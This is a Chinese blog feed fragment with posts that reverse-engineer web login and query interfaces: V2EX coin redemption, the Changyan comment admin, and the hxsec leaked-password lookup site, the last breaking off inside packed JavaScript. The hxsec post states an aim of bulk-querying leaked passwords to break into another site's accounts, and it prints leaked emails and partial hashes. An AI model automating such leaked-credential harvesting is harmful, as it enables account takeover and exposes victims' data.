<p>通过下面的代码跳到领取页面。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">url = &apos;https://www.v2ex.com/mission/daily&apos;</div><div class="line">r= self.s.get(url)</div></pre></td></tr></table></figure> <p>然后看看领取按钮对应的链接，又见once！so，链接不是固定的了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;div class=&quot;cell&quot;&gt;</div><div class="line">        &lt;h1&gt;每日登录奖励 20170818&lt;/h1&gt;</div><div class="line">        &lt;input type=&quot;button&quot; class=&quot;super normal button&quot; value=&quot;领取 X 铜币&quot; onclick=&quot;location.href = &apos;/mission/daily/redeem?once=48881&apos;;&quot; /&gt;</div><div class="line">    &lt;/div&gt;</div></pre></td></tr></table></figure> <p>动态获取once对应的值，正则跟退出接口很像：<code>r&quot;&#39;/mission/daily/redeem\?once=([\d\w]+?)&#39;&quot;</code></p> <p>然后模拟请求领取奖励。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url = &apos;https://www.v2ex.com/mission/daily/redeem&apos;</div><div class="line">payload = &#123; &apos;once&apos;: once&#125;</div><div class="line">r = self.s.get(url, params=payload)</div></pre></td></tr></table></figure> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好了，到这里分析就完成了。分析内容非常详细，然后也贴了些关键代码，所以完整代码就暂时不提供了！</p> <p>v2ex登录通过变化的名字和密码字段，以及once的值，增加了一定的分析成本，但是总的来说，还是没什么难度！挡不了多少人！</p> <p>其他自动回复啊，最新主题啊…等等，各位看官自行脑洞了！</p> <p>pylogin系列还将继续，尽请关注！</p> <p>安利一下公众号：汉客儿</p> <p><img src="/img/wechat_public.png" alt="img"></p> <p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-v2ex-login-analyze/">https://anhkgg.github.io/pylogin-v2ex-login-analyze/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;最近开始混v2ex，v2ex发主题、回复都要收钱，发帖收钱还跟字数相关，之前不知道这些，发个帖子内容太多，kao，没钱了！&lt;/p&gt; &lt;p&gt;虽然主题有人回复会收到钱，但是也没人回复啊，也不知道v2ex大佬们喜欢什么内容！&lt;/p&gt; &lt;p&gt;幸好v2ex有个登录领币任务，每天还可以攒点钱，但是有些时候会忘啊，怎么办？…&lt;/p&gt; &lt;p&gt;嗯，程序员嘛，偷懒的办法多…这就开始分析接口，自动领币！&lt;/p&gt;          </summary>            <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>                 <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>            <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>            <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>            <category term="v2ex" scheme="https://anhkgg.github.io/tags/v2ex/"/>            <category term="自动领币" scheme="https://anhkgg.github.io/tags/%E8%87%AA%E5%8A%A8%E9%A2%86%E5%B8%81/"/>        </entry>      <entry>     <title>pylogin系列之畅言登录评论接口分析</title>     <link href="https://anhkgg.github.io/pylogin-changyan-login-analyze/"/>     <id>https://anhkgg.github.io/pylogin-changyan-login-analyze/</id>     <published>2017-08-16T16:47:29.000Z</published>     <updated>2017-08-16T17:05:02.928Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>博客使用了畅言做评论系统（多说、网易云跟帖tmd相继挂了…）。<br>畅言后台可以看出功能非常强大，居然还有广告业务…<br>but，畅言登录之后，即使你选择了记住登录，也会在每次关闭浏览器后需要重新登录，很累好伐！</p> <p>折腾了我几天之后，决定还是决定分析一下登录协议，以及简单后台操作接口，然后写个脚本跑着吧，有新评论就给我”叮”一下，就不用我常常登录去翻了！</p> <a id="more"></a> <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>开始分析，工具：</p> <ol> <li>chrome/firefox</li> <li>f12，network</li> <li>python</li> </ol> <h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>chrome打开主页<a href="http://changyan.kuaizhan.com。" target="_blank" rel="external">http://changyan.kuaizhan.com。</a></p> <p>F12，调到network的tab页，然后输入登录，找到登录的包。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">Request URL:http://changyan.kuaizhan.com/loginAjax?callback=jQuery17107352265034825938_1502508074058&amp;name=xxx&amp;rememberMe=true&amp;password=1111111&amp;vcode=4795&amp;vipIsvId=0&amp;_=1502508184633</div><div class="line">Request Method:GET</div><div class="line">Status Code:200 OK</div><div class="line"></div><div class="line">Host:changyan.kuaizhan.com</div><div class="line">Referer:http://changyan.kuaizhan.com/</div><div class="line">User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36</div><div class="line">X-Requested-With:XMLHttpRequest</div><div class="line"></div><div class="line">callback:jQuery17107352265034825938_1502508074059 //可以没有</div><div class="line">name:xxx</div><div class="line">rememberMe:true</div><div class="line">password:1111111</div><div class="line">vcode:1882</div><div class="line">vipIsvId:0</div><div class="line">_:1502508368658</div><div class="line"></div><div class="line">//响应</div><div class="line">jQuery17101803876020131434_1502867163749(&#123;&quot;data&quot;:&#123;&#125;,&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;&#125;); //发送了callback</div><div class="line">&#123;&quot;data&quot;:&#123;&#125;,&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;&#125;; //没有发送callback</div><div class="line"></div><div class="line">//其他状态</div><div class="line">&#123;&quot;code&quot;:2,&quot;msg&quot;:&quot;验证码错误&quot;&#125;; </div><div class="line">&#123;&quot;code&quot;:2,&quot;msg&quot;:&quot;用户名或密码错误!&quot;&#125;</div></pre></td></tr></table></figure> <p>很清晰，使用GET，ajax发送数据，主要发送name, password, vcode等数据，经验证callback是可以不需要的，如果发送callback，返回数据会包一层 <code>jQuery17101803876020131434_1502867163749(data)</code>, 如果没有callback，直接返回data。</p> <p>很幸运的是，password没有做任何处理（貌似未强制https，那密码不是明文了…差评！）。没做处理，我倒简单了，不用做多余分析了，登录接口基本就这样。</p> <p>然后是返回数据，是json数据，成功code是0，错误code是2，然后是具体错误msg。不细说。</p> <h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>每次登录都需要验证码，挺烦的。为了自动登录，还得拿到验证码。</p> <p>获取验证码接口如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Request URL:http://changyan.kuaizhan.com/verifyCode?_1502508320545</div><div class="line">Request Method:GET</div><div class="line"></div><div class="line">Content-Type:image/jpeg; charset=UTF-8</div></pre></td></tr></table></figure> <p>返回一张jpg图片，验证码处理比较简单，应该可以用tesseract-ocr识别，没有验证。</p> <p><img src="/img/changyan1.png" alt="img"></p> <h2 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h2><p>登录成功后，进入后台。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Request URL:http://changyan.kuaizhan.com/overview</div><div class="line">Request Method:GET</div><div class="line">Status Code:200 OK</div></pre></td></tr></table></figure> <p><img src="/img/changyan2.png" alt="img"></p> <p>返回整个后台页面，通过页面元素找到评论位置，html代码如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;li class=&quot;right-sub-li &quot;&gt;&lt;a href=&quot;/audit/comments/TOAUDIT/1&quot; style=&quot;text-indent:25px;&quot;&gt;</div><div class="line">    &lt;span class=&quot;audit-number&quot;&gt;2&lt;/span&gt;</div><div class="line">    &lt;span style=&quot;text-indent:0px;&quot;&gt;本站评论审核&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</div></pre></td></tr></table></figure> <p>通过<code>r&#39;&lt;span class=&quot;audit-number&quot;&gt;(\d+?)&lt;/span&gt;&#39;</code>正则可以获取到待审核评论数，也就是新增评论，要的就是这个。</p> <h2 id="评论统计接口"><a href="#评论统计接口" class="headerlink" title="评论统计接口"></a>评论统计接口</h2><p>获取评论信息接口，使用的是ajax访问（我这用不上，顺便分析下）。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Request URL:http://changyan.kuaizhan.com/stat-data/comment</div><div class="line">Request Method:POST</div><div class="line">Status Code:200 OK</div><div class="line"></div><div class="line">Host:changyan.kuaizhan.com</div><div class="line">Origin:http://changyan.kuaizhan.com</div><div class="line">Referer:http://changyan.kuaizhan.com/overview</div><div class="line">User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36</div><div class="line">X-Requested-With:XMLHttpRequest</div><div class="line"></div><div class="line">start:20170805</div><div class="line">end:20170811</div><div class="line">categoryId:0</div><div class="line"></div><div class="line">//响应</div><div class="line">&#123;&quot;sdk_user_data&quot;:&#123;&#125;,&quot;user_data&quot;:&#123;&quot;20170810&quot;:1&#125;,&quot;sdk_cmt_data&quot;:&#123;&#125;,&quot;wap_cmt_data&quot;:&#123;&#125;,&quot;total_data&quot;:&#123;&quot;20170810&quot;:1,&quot;20170811&quot;:0&#125;,&quot;recommender_data&quot;:&#123;&#125;,&quot;wap_user_data&quot;:&#123;&#125;,&quot;cmt_data&quot;:&#123;&quot;20170810&quot;:1&#125;,&quot;wap_reply_data&quot;:&#123;&#125;,&quot;flood_data&quot;:&#123;&quot;20170810&quot;:0,&quot;20170811&quot;:0&#125;,&quot;sdk_reply_data&quot;:&#123;&#125;,&quot;success&quot;:true&#125;</div></pre></td></tr></table></figure> <p>接口使用ajax POST，发送参数可以选择时间区间。</p> <p>返回数据为json，具体意义如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">cmt_data : &#123;20170810: 1&#125; //评论数据1条</div><div class="line">flood_data : &#123;20170810: 0, 20170811: 0, 20170812: 0, 20170813: 0, 20170814: 0, 20170815: 0&#125; //每天flooddata多少条</div><div class="line">recommender_data : &#123;&#125;</div><div class="line">sdk_cmt_data : &#123;&#125;</div><div class="line">sdk_reply_data : &#123;&#125;</div><div class="line">sdk_user_data : &#123;&#125;</div><div class="line">success : true //获取评论信息成功</div><div class="line">total_data : &#123;20170810: 1, 20170811: 0, 20170812: 0, 20170813: 0, 20170814: 0, 20170815: 0&#125; // 所有评论数据</div><div class="line">user_data : &#123;20170810: 1&#125; //用户数据1条</div><div class="line">wap_cmt_data : &#123;&#125; //手机评论数据</div><div class="line">wap_reply_data : &#123;&#125;</div><div class="line">wap_user_data : &#123;&#125;</div></pre></td></tr></table></figure> <p>对应页面如下：</p> <p><img src="/img/changyan3.png" alt="img"></p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>畅言登录简单，密码未做处理，安全性有待提高。</p> <p>接口不统一，评论数据需要正则匹配。</p> <p>不过为了实现自己的小功能，还是挺简单的！</p> <p>接口分析完，通过py实现以下接口。自动登录（不识别验证码，需要手动输入），然后每间隔30分钟访问一下后台页面，获取新的评论信息，如果有新的待评审数据，声音或弹窗提醒。</p> <p>完毕！</p> <p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-changyan-login-analyze/">https://anhkgg.github.io/pylogin-changyan-login-analyze/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;博客使用了畅言做评论系统（多说、网易云跟帖tmd相继挂了…）。&lt;br&gt;畅言后台可以看出功能非常强大，居然还有广告业务…&lt;br&gt;but，畅言登录之后，即使你选择了记住登录，也会在每次关闭浏览器后需要重新登录，很累好伐！&lt;/p&gt; &lt;p&gt;折腾了我几天之后，决定还是决定分析一下登录协议，以及简单后台操作接口，然后写个脚本跑着吧，有新评论就给我”叮”一下，就不用我常常登录去翻了！&lt;/p&gt;          </summary>            <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>                 <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>            <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>            <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>            <category term="畅言" scheme="https://anhkgg.github.io/tags/%E7%95%85%E8%A8%80/"/>        </entry>      <entry>     <title>看我鼓捣华西安全网(cha.hxsec.com)密码泄露查询接口（有意思的js混淆）</title>     <link href="https://anhkgg.github.io/hxsec-search-pwd-interface-analyze/"/>     <id>https://anhkgg.github.io/hxsec-search-pwd-interface-analyze/</id>     <published>2017-08-09T15:34:25.000Z</published>     <updated>2017-08-09T22:30:22.762Z</updated>          <content type="html"><![CDATA[<h1 id="0x00-开始"><a href="#0x00-开始" class="headerlink" title="0x00 开始"></a>0x00 开始</h1><p>最近爬个站的数据，然后想扫一下其他网站的同一个账号名能否找到泄露的密码，然后在这个站嘿嘿一下…</p> <p>在 <a href="https://www.sec-wiki.com/topic/12" target="_blank" rel="external">sec-wiki</a> 找到了<a href="http://cha.hxsec.com/" target="_blank" rel="external">这个密码泄露查询网站</a>。</p> <p>随便用了一下，发现网站虽然讲密码打码了，但是某些数据还是可以猜出来原始的内容，或者通过简单的计算拿到原始的内容。</p> <p>but，我不能一个个输入然后看吧，数据虽然少，也有上千条啊，怎么说也是个python程序员，怎么也得鼓捣一下。</p> <p>分析一下hxsec的查询接口，用python批量一下。</p> <a id="more"></a> <h1 id="0x01-分析接口"><a href="#0x01-分析接口" class="headerlink" title="0x01 分析接口"></a>0x01 分析接口</h1><p>hxsec查询界面如下：<br><img src="/img/hxsec1.png" alt="img"></p> <p>其实接口很简单，f12，切换到network栏，然后随便输入什么，点击试试吧皆可以。</p> <p>看到访问的网络接口如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Request URL:http://cha.hxsec.com/ajax.php?act=select</div><div class="line">Request Method:POST</div><div class="line">Status Code:200 OK</div><div class="line"></div><div class="line">select_act:3</div><div class="line">match_act:2</div><div class="line">key:ll111</div><div class="line">table:212300_cxhr_zhaopin_com</div></pre></td></tr></table></figure> <p>参数都特别简单，<code>select_act</code>表示<code>User and Email/User/Emial</code>，<code>match_act</code>表示模糊/精确查询，key就是输入的关键字。最后一个table比较重要了，表示在什么库中查询，扫描时看到进度变化，在什么库中进行了多少了，每次搜索都会在这所有库中搜索，直到结束。</p> <p>这个数据应该存在了本地，或者初始化时服务器返回了。暂时不管，后面继续重点分析（有意思的就在这）。</p> <p>请求返回数据，有下面几种情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">没有返回空内容</div><div class="line"></div><div class="line">//该库只有一条数据</div><div class="line">addRow(&quot;ll111&quot;,&quot;348720221@qq.com&quot;,&quot;202**962AC59075B964B07152D234B70&quot;,&quot;212300_cxhr_zhaopin_com&quot;);</div><div class="line"></div><div class="line">//该库有多少数据</div><div class="line">addRow(&quot;&apos;fish13&apos;, &apos;fish1346@qq.com&apos;, &apos;**&apos;, &apos;mail_qq_sohu&quot;);addRow(&quot;fish13&apos;, &apos;592545012@qq.com&apos;, &apos;**&apos;, &apos;mail_qq_sohu&quot;);addRow(&quot;fish13&apos;, &apos;m_srikanth@sohu.com&apos;, &apos;**&apos;, &apos;mail_qq_sohu&apos;], [&apos;fish13&apos;, &apos;&apos;, &apos;176**1176671&apos;, &apos;qq_old_password&apos;</div></pre></td></tr></table></figure></p> <h1 id="0x02-分析table"><a href="#0x02-分析table" class="headerlink" title="0x02 分析table"></a>0x02 分析table</h1><p>其实接口很清楚了，但是还需要直到所有table的内容，然后才能完成所有数据搜索。</p> <p>所以，table怎么找，在哪里呢！</p> <p>还是要分析代码了…</p> <p>看看表单所在位置代码，找找搜索按钮的响应函数（这里也可以看到上面说的参数的详情），很明显响应函数是getdata。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;p&gt;&lt;span class=&quot;input-group&quot;&gt;</div><div class="line">  &lt;select class=&quot;btn btn-success&quot; id=&quot;match_act&quot; name=&quot;match_act&quot;&gt;</div><div class="line">    &lt;option value=&quot;2&quot; selected=&quot;&quot;&gt;精确匹配&lt;/option&gt;</div><div class="line">    &lt;option value=&quot;1&quot;&gt;模糊查询&lt;/option&gt;</div><div class="line">  &lt;/select&gt;</div><div class="line"> </div><div class="line">  &lt;select class=&quot;btn btn-primary&quot; id=&quot;select_act&quot; name=&quot;select_act&quot;&gt;</div><div class="line">    &lt;option class=&quot;btn-group&quot; value=&quot;3&quot; selected=&quot;&quot;&gt;User and Email&lt;/option&gt;</div><div class="line">    &lt;option  class=&quot;btn-group&quot; value=&quot;1&quot;&gt;Username&lt;/option&gt;</div><div class="line">    &lt;option class=&quot;btn-group&quot; value=&quot;2&quot;&gt;Email&lt;/option&gt;</div><div class="line">  &lt;/select&gt;</div><div class="line">  &lt;/span&gt;&lt;/p&gt;</div><div class="line">  &lt;div id=&quot;jshint-pitch&quot; class=&quot;alert alert-info scan-wait&quot; style=&quot;display:none;margin-top:10px;font-size:14px&quot;&gt;  &lt;/div&gt;</div><div class="line">  &lt;div id=&quot;scan-result-box&quot; style=&quot;font-size:12px;&quot;&gt;</div><div class="line">    &lt;div class=&quot;input-group&quot;&gt;&lt;span class=&quot;input-group-btn scan-but-span&quot;&gt;</div><div class="line">      &lt;button type=&quot;button&quot; class=&quot;btn btn-success&quot; onClick=&quot;getdata();&quot;&gt;试试吧!&lt;/button&gt;</div><div class="line">      &lt;/span&gt;</div><div class="line">      &lt;input placeholder=&quot;华西安全网提示：输入用户名、QQ、Email..看看你的密码是否泄露~~~请勿非法用途~~&quot;  name=&quot;key&quot; class=&quot;form-control&quot; id=&quot;key&quot; &gt;&lt;/input&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line"> &lt;br&gt;</div></pre></td></tr></table></figure> <p>在html，js中一番搜索，tmd居然没有。<br>只在system.js中看到了这个！</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">傻逼|你TM的来打我啊|getdata|stend|u5927|</div></pre></td></tr></table></figure> <p><img src="/img/hxsec2.png" alt="img"></p> <p>—-手工分割线——-</p> <p>TMD的，我这暴脾气，这是挑衅啊，lz非搞你不可了！这已经上升到人身攻击了！！！</p> <p>—-手工分割线——-</p> <p>很明显，tmd代码混淆了。怎么办，调试跟呗。</p> <p>把system.js（用chrome格式化一下，不然…瞎眼）扒出来一看，其实也不复杂。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">//jb 5/24修改</div><div class="line">eval(function(p, a, c, k, e, d) &#123;</div><div class="line">    e = function(c) &#123;</div><div class="line">        return (c &lt; a ? &quot;&quot; : e(parseInt(c / a))) + ((c = c % a) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36))</div><div class="line">    &#125;</div><div class="line">    ;</div><div class="line">    if (!&apos;&apos;.replace(/^/, String)) &#123;</div><div class="line">        while (c--)</div><div class="line">            d[e(c)] = k[c] || e(c);</div><div class="line">        k = [function(e) &#123;</div><div class="line">            return d[e]</div><div class="line">        &#125;</div><div class="line">        ];</div><div class="line">        e = function() &#123;</div><div class="line">            return &apos;\\w+&apos;</div><div class="line">        &#125;</div><div class="line">        ;</div><div class="line">        c = 1;</div><div class="line">    &#125;</div><div class="line">    ;while (c--)</div><div class="line">        if (k[c])</div><div class="line">            p = p.replace(new RegExp(&apos;\\b&apos; + e(c) + &apos;\\b&apos;,&apos;g&apos;), k[c]);</div><div class="line">    return p;</div><div class="line">&#125;(&apos;3o 2Y$=[&quot;&quot;,\&apos;\&apos;,\&apos;\\\\w+\&apos;,\&apos;\\\\b\&apos;,\&apos;\\\\b\&apos;,\&apos;g\&apos;,\&apos;d c$=[&quot;1W&quot;,&quot;#n&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#n&quot;,&quot;\\\\2h\\\\2g\\\\k\\\\p&quot;,&quot; \\\\2i\\\\2k\\\\1N&quot;,&quot;%&quot;,&quot;H&quot;,&quot;H&quot;,&quot;#n&quot;,&quot;\\\\k\\\\p\\\\T\\\\O!\\\\1q\\\\1t\\\\1j\\\\1k\\\\1g\\\\G\\\\D\\\\E\\\\U\\\\W \\\\z\\\\A: &quot;,&quot;\\\\C\\\\B&quot;,&quot;#n&quot;,&quot;\\\\k\\\\p\\\\T\\\\O! \\\\U\\\\W\\\\1v:&quot;,&quot;\\\\1u \\\\z\\\\A:&quot;,&quot;\\\\C\\\\B&quot;,&quot;#n&quot;,&quot;\\\\k\\\\p\\\\T\\\\O! \\\\U\\\\W\\\\1v:&quot;,&quot;\\\\1u \\\\z\\\\A:&quot;,&quot;\\\\C\\\\B&quot;,\\\&apos;2j\\\&apos;,&quot;1D&quot;,&quot;1p=&quot;,&quot;&amp;1o=&quot;,&quot;&amp;I=&quot;,&quot;&amp;2c=&quot;,\\\&apos;1O.2b?2d=2f\\\&apos;,&quot;#H&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#I&quot;,\\\&apos;\\\&apos;,&quot;#I&quot;,&quot;\\\\Z\\\\2e\\\\2l\\\\k\\\\p\\\\1r\\\\1n/\\\\G\\\\D\\\\E/\\\\2s\\\\2r&quot;,&quot;\\\\G\\\\D\\\\E\\\\2t\\\\1N\\\\Z\\\\2v\\\\2u!!&quot;,&quot;#1p&quot;,&quot;#1o&quot;,&quot;1C&quot;,&quot;\\\\1q\\\\1t\\\\2n\\\\1g\\\\2m\\\\1j\\\\1k\\\\2o\\\\1r\\\\1n\\\\2q&quot;,&quot;2p|2a~!1X~!1Z|a|1Y|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b&quot;];d o;d N;e 1D(1y,1U,1J,Y)&#123;d l=1C[&quot;2V&quot;]();d 1A=l[&quot;q&quot;](0);d 1I=l[&quot;q&quot;](1);d 1V=l[&quot;q&quot;](2);d 1M=l[&quot;q&quot;](3);1A[&quot;w&quot;]=1y;1I[&quot;w&quot;]=1U;1V[&quot;w&quot;]=1J;1M[&quot;w&quot;]=Y&#125;;e 1x()&#123;$( c$[0])[&quot;2U&quot;]()&#125;;e 1Q(1l,1e,1b)&#123;$( c$[1])[&quot;1z&quot;]( c$[2], c$[3]);d 1c=(1l/1e)*g;d M=X(1c,1);t[&quot;r&quot;]( c$[4],M,g, c$[5]+1b+ c$[6]+M+ c$[7])&#125;;e 1L()&#123;v=1F 1G()[&quot;1H&quot;]()-N;d 1s=R[&quot;Q&quot;]( c$[8]);d y=1s[&quot;P&quot;][&quot;f&quot;];i(y==1)&#123;d 1i=R[&quot;Q&quot;]( c$[9]);d 1m=1i[&quot;P&quot;][&quot;f&quot;];i(1m==1)&#123;t[&quot;r&quot;]( c$[10],g,g, c$[11]+(v)+ c$[12])&#125;1h&#123;t[&quot;r&quot;]( c$[13],g,g, c$[14]+(y-1)+ c$[15]+(v)+ c$[16])&#125;&#125;1h&#123;t[&quot;r&quot;]( c$[17],g,g, c$[18]+(y-1)+ c$[19]+(v)+ c$[20])&#125;&#125;;e X(1a,1d)&#123;d F=1f[&quot;2T&quot;](10,1d);S 1f[&quot;2X&quot;](1a*F)/F&#125;;e 1S(1P,s,1K,2W)&#123;$[&quot;1O&quot;](&#123;2D: c$[21],2C:1P,2E:s,2G:e(J)&#123;i(J[&quot;2F&quot;]( c$[22])&gt;=0)&#123;2B(J)&#125;;i(1K==V[&quot;f&quot;])&#123;1L()&#125;&#125;&#125;)&#125;;e 1E(j,u,x,m,h)&#123;1Q(h+1,m[&quot;f&quot;],m[h]);d s= c$[23]+u+ c$[24]+x+ c$[25]+j+ c$[26]+m[h];1S( c$[27],s,o+1,m[&quot;f&quot;]);o=o+1&#125;;e 2x()&#123;$( c$[28])[&quot;1z&quot;]( c$[29], c$[2w]);1x();d j=$( c$[2y])[&quot;K&quot;]();i(j== c$[2A])&#123;$( c$[2z])[&quot;2H&quot;]();L( c$[2P]);S 1w&#125;;i(j[&quot;f&quot;]&lt;4)&#123;L( c$[2O]);S 1w&#125;;d u=$( c$[2Q])[&quot;K&quot;]();d x=$( c$[2S])[&quot;K&quot;]();N=1F 1G()[&quot;1H&quot;]();o=0;2R(d h=0;h&lt;V[&quot;f&quot;];h++)&#123;1E(j,u,x,V,h)&#125;&#125;;e 2N()&#123;d 1B=R[&quot;Q&quot;]( c$[2J])[&quot;P&quot;][&quot;f&quot;];i(1B==0)&#123;L( c$[2I])&#125;&#125;;e 2K()&#123;d 2M= c$[2L]&#125;\&apos;,\&apos;||||||||||4U|4R|2Y|3o|3e|4Q|4T|4S|3h|54|53|56|50|52|4z|4B|4M|4O|4J|5w|5v|5q|5s|4b|4c|49|4a|4f|4g|4d|4e|48|42|43|3Z|41|46|47|3f|44|45|4h|4t|4u|3b|4r|4s|4x|4y|4v|4w|4q|||||||||||4k|4l|2Z|4i|4j|4o|4p|4m|4n|3Y|3p|3d|3u|3v|3w|3y|3A|3z|3x|3E|3F|3D|3B|3C|3s|3t|3r|3q|3R|3S|3P|3j|3Q|3T|3W|3X|3U|3V|3I|3J|3G|3H|3K|3N|3O|3L|3M|5j|5k|5h|5i|5n|||||||||||5o|5l|5m|5g|5a|5b|58|59|5e|5f|5c|5d|5A|5B|5y|5z|5E|5F|5C|5D|5x|5r|30|5p|31|33|32|3n|5t|5u|57|4K|4L|4I|39|38|4P|40|4N|4H|35|34|36|4C|37|4A|4F|4G|4D|4E\&apos;,\&apos;|\&apos;];3n(3e(3g,3d,2Z,3c,e,3f)&#123;e=3e(3a)&#123;3b(3a&lt;3d? 2Y$[0]:e(51(3a/3d)))+((3a=3a%3d)&gt;35?3i[&quot;4Z&quot;](3a+29):3a[&quot;55&quot;](36))&#125;;3h(! 2Y$[1][&quot;3k&quot;](/^/,3i))&#123;3m(2Z--)3f[e(2Z)]=3c[2Z]||e(2Z);3c=[3e(3l)&#123;3b 3f[3l]&#125;];e=3e()&#123;3b 2Y$[2]&#125;;2Z=1&#125;;3m(2Z--)3h(3c[2Z])3g=3g[&quot;3k&quot;](3j 4Y( 2Y$[3]+e(2Z)+ 2Y$[4], 2Y$[5]),3c[2Z]);3b 3g&#125;( 2Y$[6],4W,4X, 2Y$[7][&quot;4V&quot;]( 2Y$[8]),0,&#123;&#125;))&apos;, 62, 352, 